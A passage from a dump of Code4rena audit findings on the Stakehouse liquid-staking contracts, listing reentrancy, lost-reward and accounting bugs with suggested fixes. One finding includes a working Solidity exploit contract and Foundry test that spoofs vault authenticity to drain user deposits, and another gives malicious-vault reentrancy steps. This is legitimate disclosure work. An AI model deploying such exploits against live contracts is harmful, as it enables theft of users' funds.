breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L96-L107)  ### [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143):  The possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L128-L133), this function call the recipient making the possibility of the reentrancy, breaking the code of [L136-L142](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L136-L142)  ### [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340):  The possibility of the reentrancy is given when call function `_distributeETHRewardsToUserForToken` in [L333](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L333) and [L337](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L337), this function call the recipient making the possibility of the reentrancy, breaking the code of [L343-L351](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L343-L351)  ### Tools Used  Review  ### Recommended Mitigation Steps  One possibility its wrap(`deposit`) ether in WETH and transfer as ERC20 token  Another, it's add `nonReentrant` guard to the functions: - [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) - [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90) - [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104) - [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143) - [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340)  ```diff File: contracts/liquid-staking/GiantMevAndFeesPool.sol  @@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate      }       /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed -    function beforeTokenTransfer(address _from, address _to, uint256) external { +    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {          require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");          updateAccumulatedETHPerLP(); ```  ```diff File: contracts/liquid-staking/GiantPoolBase.sol  @@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {      /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP      /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool      /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP -    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external { +    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {          uint256 amountOfTokens = _lpTokens.length;          require(amountOfTokens > 0, \"Empty arrays\");          require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\"); ```  ```diff File: contracts/liquid-staking/StakingFundsVault.sol  @@ -66,7 +66,7 @@ contract StakingFundsVault is      /// @notice Batch deposit ETH for staking against multiple BLS public keys      /// @param _blsPublicKeyOfKnots List of BLS public keys being staked      /// @param _amounts Amounts of ETH being staked for each BLS public key -    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable { +    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {          uint256 numOfValidators = _blsPublicKeyOfKnots.length;          require(numOfValidators > 0, \"Empty arrays\");          require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");  @@ -110,7 +110,7 @@ contract StakingFundsVault is      /// @notice Deposit ETH against a BLS public key for staking      /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner      /// @param _amount Amount of ETH being staked -    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) { +    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {          require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");          require(              getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,  @@ -312,7 +312,7 @@ contract StakingFundsVault is      }       /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards -    function beforeTokenTransfer(address _from, address _to, uint256) external override { +    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {          address syndicate = liquidStakingNetworkManager.syndicate();          if (syndicate != address(0)) {              LPToken token = LPToken(msg.sender); ``` "}, {"title": "smartWallet address is not guaranteed correct. ETH may be lost", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-20"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L206-L207 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209   # Vulnerability details  ## Impact Liquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` to withdraw ETH for staking. It's manager's responsibility to set the correct `_smartWallet` address. However, there is no way to guarantee this. If a typo (or any other reasons) leads to a non-zero non-existent `_smartWallet` address, this function won't be able to detect the problem, and the [ETH transfer statement](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209) will always return `true`. This will result in the ETH permanently locked to a non-existent account.  ## Proof of Concept Liquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` with a non-zero non-existent `_smartWallet` address and some `_amount` of ETH. Function call will succeed but the ETH will be locked to the non-existent `_smartWallet` address.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps The problem can be solved if we can verify the `_smartWallet` is a valid existent smartWallet before ETH transfer. The easiest solution is to verify the smartWallet has a valid owner since the smart wallet we are using is ownable. So, just add the checking owner code before [ETH transfer](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209)."}, {"title": "withdrawETH() in GiantPoolBase don't call _distributeETHRewardsToUserForToken() or _onWithdraw() which would make users to lose their remaining rewards ", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-19"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193   # Vulnerability details  ## Impact Function `_distributeETHRewardsToUserForToken()` is used to distribute remaining reward of user and it's called in `_onWithdraw()` of `GiantMevAndFeesPool`. but function `withdrawETH()` in `GiantPoolBase` don't call either of them and burn user giant LP token balance so if user withdraw his funds and has some remaining ETH rewards he would lose those rewards because his balance set to zero.  ## Proof of Concept This is `withdrawETH()` code in `GiantPoolBase`: ```     /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract     /// @param _amount of LP tokens user is burning in exchange for same amount of ETH     function withdrawETH(uint256 _amount) external nonReentrant {         require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");         require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");         require(idleETH >= _amount, \"Come back later or withdraw less ETH\");          idleETH -= _amount;          lpTokenETH.burn(msg.sender, _amount);         (bool success,) = msg.sender.call{value: _amount}(\"\");         require(success, \"Failed to transfer ETH\");          emit LPBurnedForETH(msg.sender, _amount);     } ``` As you can see it burn user `lpTokenETH` balance and don't call either `_distributeETHRewardsToUserForToken()` or `_onWithdraw()`. and in function `claimRewards()` uses `lpTokenETH.balanceOf(msg.sender)` to calculate user rewards so if user balance get to `0` user won't get the remaining rewards. These are steps that this bug happens: 1. `user1` deposit `10` ETH into the giant pool and `claimed[user1][lpTokenETH]` is `20` and `accumulatedETHPerLPShare` is `2`. 2. some time passes and `accumulatedETHPerLPShare` set to `3`. 3. `user1` unclaimed rewards are `10 * 3 - 20 = 10` ETH. 4. `user1` withdraw his `10` ETH by calling `withdrawETH(10)` and contract set `lpTokenETH` balance of `user1`  to `0` and transfer `10` ETH to user. 5. now if `user1` calls `claimRewards()` he would get `0` reward as his `lpTokenETH` balance is `0`.  so users lose their unclaimed rewards by withdrawing their funds.  ## Tools Used VIM  ## Recommended Mitigation Steps user's unclaimed funds should be calculated and transferred before any actions that change user's balance."}, {"title": "Giant pools can be drained due to weak vault authenticity check", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-17"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50 https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44   # Vulnerability details  ## Impact An attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected. ## Proof of Concept The `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)): ```solidity SavETHVault savETHPool = SavETHVault(_savETHVaults[i]); require(     liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),     \"Invalid liquid staking manager\" );  // Deposit ETH for staking of BLS key savETHPool.batchDepositETHForStaking{ value: transactionAmount }(     _blsPublicKeys[i],     _stakeAmounts[i] ); ```  An attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract: ```solidity // test/foundry/GiantPools.t.sol contract GiantPoolExploit {     address immutable owner = msg.sender;     address validStakingManager;      constructor(address validStakingManager_) {         validStakingManager = validStakingManager_;     }      function liquidStakingManager() public view returns (address) {         return validStakingManager;     }      function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {         payable(owner).transfer(address(this).balance);     } }  function testPoolDraining_AUDIT() public {     // Register BLS key     address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);     registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);      // Set up users and ETH     address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);      address attacker = address(0x1337);     vm.label(attacker, \"attacker\");     vm.deal(attacker, 1 ether);      // User deposits ETH into Giant savETH     vm.prank(savETHUser);     giantSavETHPool.depositETH{value: 24 ether}(24 ether);     assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);     assertEq(address(giantSavETHPool).balance, 24 ether);      // Attacker deploys an exploit.     vm.startPrank(attacker);     GiantPoolExploit exploit = new GiantPoolExploit(address(manager));     vm.stopPrank();      // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.     bytes[][] memory blsKeysForVaults = new bytes[][](1);     blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);      uint256[][] memory stakeAmountsForVaults = new uint256[][](1);     stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);      giantSavETHPool.batchDepositETHForStaking(         getAddressArrayFromValues(address(exploit)),         getUint256ArrayFromValues(24 ether),         blsKeysForVaults,         stakeAmountsForVaults     );      // Vault got nothing.     assertEq(address(manager.savETHVault()).balance, 0 ether);     // Attacker has stolen user's deposit.     assertEq(attacker.balance, 25 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider taking a list of `LiquidStakingManager` addresses instead of vault addresses: ```diff --- a/contracts/liquid-staking/GiantSavETHVaultPool.sol +++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol @@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {      /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding      /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding      function batchDepositETHForStaking( -        address[] calldata _savETHVaults, +        address[] calldata _liquidStakingManagers,          uint256[] calldata _ETHTransactionAmounts,          bytes[][] calldata _blsPublicKeys,          uint256[][] calldata _stakeAmounts      ) public { -        uint256 numOfSavETHVaults = _savETHVaults.length; +        uint256 numOfSavETHVaults = _liquidStakingManagers.length;          require(numOfSavETHVaults > 0, \"Empty arrays\");          require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");          require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\"); @@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {           // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator          for (uint256 i; i < numOfSavETHVaults; ++i) { +            require( +                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]), +                \"Invalid liquid staking manager\" +            ); +              uint256 transactionAmount = _ETHTransactionAmounts[i];               // As ETH is being deployed to a savETH pool vault, it is no longer idle              idleETH -= transactionAmount;  -            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]); -            require( -                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())), -                \"Invalid liquid staking manager\" -            ); +            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i])); +            SavETHVault savETHPool = liquidStakingManager.savETHVault();               // Deposit ETH for staking of BLS key              savETHPool.batchDepositETHForStaking{ value: transactionAmount }( ```"}, {"title": "Reentrancy vulnerability in GiantMevAndFeesPool.withdrawETH", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-16"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64   # Vulnerability details  ## Impact GiantMevAndFeesPool.withdrawETH calls lpTokenETH.burn, then GiantMevAndFeesPool.beforeTokenTransfer, followed by a call to _distributeETHRewardsToUserForToken sends ETH to the user, which allows the user to call any function in the fallback. While GiantMevAndFeesPool.withdrawETH has the nonReentrant modifier, GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier. When GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards. ## Proof of Concept https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff function withdrawETH(uint256 _amount) external nonReentrant {     require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");     require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");     require(idleETH >= _amount, \"Come back later or withdraw less ETH\");  -  idleETH -= _amount;      lpTokenETH.burn(msg.sender, _amount); +  idleETH -= _amount;      (bool success,) = msg.sender.call{value: _amount}(\"\");     require(success, \"Failed to transfer ETH\");      emit LPBurnedForETH(msg.sender, _amount); } ```"}, {"title": "User lose his remaining rewards in GiantMevAndFeesPool when new deposits happen because _onDepositETH() set claimed[][] to max without transferring user remaining rewards", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-15"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48   # Vulnerability details  ## Impact When `depositETH()` is called in giant pool it calls `_onDepositETH()` which calls `_setClaimedToMax()` to make sure new ETH stakers are not entitled to ETH earned by but this can cause users to lose their remaining rewards when they deposits. code should first transfer user remaining rewards when deposit happens.  ## Proof of Concept This is `depositETH()` code in `GiantPoolBase`: ```     /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.     function depositETH(uint256 _amount) public payable {         require(msg.value >= MIN_STAKING_AMOUNT, \"Minimum not supplied\");         require(msg.value == _amount, \"Value equal to amount\");          // The ETH capital has not yet been deployed to a liquid staking network         idleETH += msg.value;          // Mint giant LP at ratio of 1:1         lpTokenETH.mint(msg.sender, msg.value);          // If anything extra needs to be done         _onDepositETH();          emit ETHDeposited(msg.sender, msg.value);     } ``` As you can see it increase user `lpTokenETH` balance and then calls `_onDepositETH()`. This is `_onDepositETH()` and `_setClaimedToMax()` code in `GiantMevAndFeesPool` contract: ```     /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued     function _onDepositETH() internal override {         _setClaimedToMax(msg.sender);     }      /// @dev Internal re-usable method for setting claimed to max for msg.sender     function _setClaimedToMax(address _user) internal {         // New ETH stakers are not entitled to ETH earned by         claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;     } ``` As you can see the code set `claimed[msg.sender][address(lpTokenETH]` to maximum value so the user wouldn't be entitled to previous rewards but if user had some remaining rewards in contract he would lose those rewards can't withdraw them. these are the steps: 1- `user1` deposit `10` ETH to giant pool and `accumulatedETHPerLPShare` value is `2` and `claimed[user1][lpTokenETH]` would be `10 * 2 = 20`. 2- some time passes and `accumulatedETHPerLPShare` set to `4` and `user1` has `10 * 4 - 20 = 20` unclaimed ETH rewards (the formula in the code: `balance * rewardPerShare - claimed`). 3- `user` deposit `5` ETH to giant pool and `accumulatedETHPerLPShare` is `4` so the code would call `_onDepositETH()` which calls `_setClaimedToMax` which sets `claimed[user1][lpTokenETH]` to `15 * 4 = 60`. 4- `user1` new remaining ETH reward would be `15 * 4 - 60 = 0`. and `user1` won't receive his rewards because when he deposits contract don't transfer remaining rewards and set claim to max so user loses his funds.  ## Tools Used VIM  ## Recommended Mitigation Steps when deposit happens contract should first send remaining rewards, then increase the user's balance and then set the user claim to max."}, {"title": "fund lose in function bringUnusedETHBackIntoGiantPool() of GiantSavETHVaultPool ETH gets back to giant pool but the value of idleETH don't increase", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-14"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25   # Vulnerability details  ## Impact Variable `idleETH` in giant pools is storing total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network and whenever a deposit or withdraw happens contract adjust the value of `idleETH` of contract, but in function `bringUnusedETHBackIntoGiantPool()` which brings unused ETH from savETH vault to giant pool the value of `idleETH` don't get increased which would cause those ETH balance to not be accessible for future staking or withdrawing.  ## Proof of Concept This is `bringUnusedETHBackIntoGiantPool()` code in `GiantSavETHVaultPool()`: ```     /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool     /// @param _savETHVaults List of savETH vaults where ETH is staked     /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault     /// @param _amounts Amounts of LP within the giant pool being burnt     function bringUnusedETHBackIntoGiantPool(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, \"Empty arrays\");         require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");         require(numOfVaults == _amounts.length, \"Inconsistent arrays\");         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);             for (uint256 j; j < _lpTokens[i].length; ++j) {                 require(                     vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,                     \"ETH is either staked or derivatives minted\"                 );             }              vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }     } ``` As you can see it checks that ETH is available in savETH vault and then calls to `burnLPTokens()` to burn savETH LP tokens and bring unused ETH to giant pool address, this would increase giant pool ETH balance but code don't increase the `idleETH` value so contract would lose tracking of real idle ETH balance of contract. because the vaule of `idleETH` is used when withdrawing or depositing into savETH vaults so the contract can't reuse the returned ETH. these are the steps that cause this bug to happen: 1- giant pool has 100 `idleETH`. 2- with function `batchDepositETHForStaking()` users stake 80 `ETH` and the new value of `idleETH` would be `20` and contract LP Token balance increase by 80. 3- the 80 newly staked ETH is not yet staked in `stakehouse`. 4- with function `bringUnusedETHBackIntoGiantPool()` users bring back those 80 `ETH` from Vaults to giant pool and burn giant pool LP tokens and then giant pool have 100 idle ETH but because `idleETH` value don't get increase it still would show `20`. 5- the extra 80 ETH would returned to giant pool wouldn't be accessible for withdrawing to users or depositing into Vaults because in withdrawing or depositing into Vaults the value of `idleETH` has been used to know the amount of idle ETH in giant pool and because the value doesn't show the correct amount so the extra amount of ETH wouldn't be lost.  ## Tools Used VIM  ## Recommended Mitigation Steps contract should correctly update value of `idleETH` in different actions because withdraw and deposit logics depend on it."}, {"title": "possible reentrancy and fund theft in withdrawDETH() of GiantSavETHVaultPool because there is no whitelist check for user provided Vaults and there is no reentrancy defnece", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-13"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L62-L102   # Vulnerability details  ## Impact Function `withdrawDETH()` in `GiantSavETHVaultPool` allows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. user can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.  ## Proof of Concept This is `withdrawDETH()` in `GiantSavETHVaultPool`  code: ```     /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults     /// @param _savETHVaults List of savETH vaults being interacted with     /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH     /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH     function withdrawDETH(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, \"Empty arrays\");         require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");         require(numOfVaults == _amounts.length, \"Inconsistent arrays\");          // Firstly capture current dETH balance and see how much has been deposited after the loop         uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);              // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user             for (uint256 j; j < _lpTokens[i].length; ++j) {                 LPToken token = _lpTokens[i][j];                 uint256 amount = _amounts[i][j];                  // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP                 _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);                  require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");                  // Giant LP is burned 1:1 with LPs from sub-networks                 require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");                  // Burn giant LP from user before sending them dETH                 lpTokenETH.burn(msg.sender, amount);                  emit LPBurnedForDETH(address(token), msg.sender, amount);             }              // Ask             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }          // Calculate how much dETH has been received from burning         dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;          // Send giant LP holder dETH owed         getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);     } ``` As you can see first contract save the dETH balance of contract by this line: `uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));` and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculates `dETHReceivedFromAllSavETHVaults` and transfer those dETH to user: ` getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);`. attacker can perform these steps: 1- create a malicious contract `AttackerVault` which is copy of `SavETHVault` with modifiction. 2- call `withdrawDETH()` with Vault list `[ValidVault1, ValidVault2, AttackerVault, ValidVaul3]`. 3- contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens. 4- contract would reach Vault `AttackerVault` and call attacker controlled address. 5- attacker contract call other functions to increase dETH balance of contract (if it's not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always) 6- `withdrawDETH()` would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.  because contract don't check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.  ## Tools Used VIM  ## Recommended Mitigation Steps check the provided addresses and also have some reentrancy defence mechanisim."}, {"title": "Sender transferring GiantMevAndFeesPool tokens can afterward experience pool DOS and orphaning of future rewards", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-12"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L170-L173   # Vulnerability details  ## Impact When a user transfers away GiantMevAndFeesPool tokens, the pool's claimed[] computed is left unchanged and still corresponds to what they had claimed with their old (higher) number of tokens. (See GiantMevAndFeesPool afterTokenTransfer() - no adjustment is made to claimed[] on the from side.) As a result, their claimed[] may be higher than the max amount they could possibly have claimed for their new (smaller) number of tokens. The erroneous claimed value can cause an integer overflow when the claimed[] value is subtracted, leading to inability for this user to access some functions of the GiantMevAndFeesPool - including such things as being able to transfer their tokens (overflow is triggered in a callback attempting to pay out their rewards). These overflows will occur in SyndicateRewardsProcessor's _previewAccumulatedETH() and _distributeETHRewardsToUserForToken(), the latter of which is called in a number of places. When rewards are later accumulated in the pool, the user will not be able to claim certain rewards owed to them because of the incorrect (high) claimed[] value. The excess rewards will be orphaned in the pool.  ## Proof of Concept This patch demonstrates both DOS and orphaned rewards due to the claimed[] error described above. Note that the patch includes a temp fix for the separate issue calculating claimed[] in _distributeETHRewardsToUserForToken() in order to demonstrate this is a separate issue.  Run test ``` forge test -m testTransferDOSUserOrphansFutureRewards ```  Patch ```diff diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol index 81be706..ca44ae6 100644 --- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol +++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol @@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {              // Calculate how much ETH rewards the address is owed / due               uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - 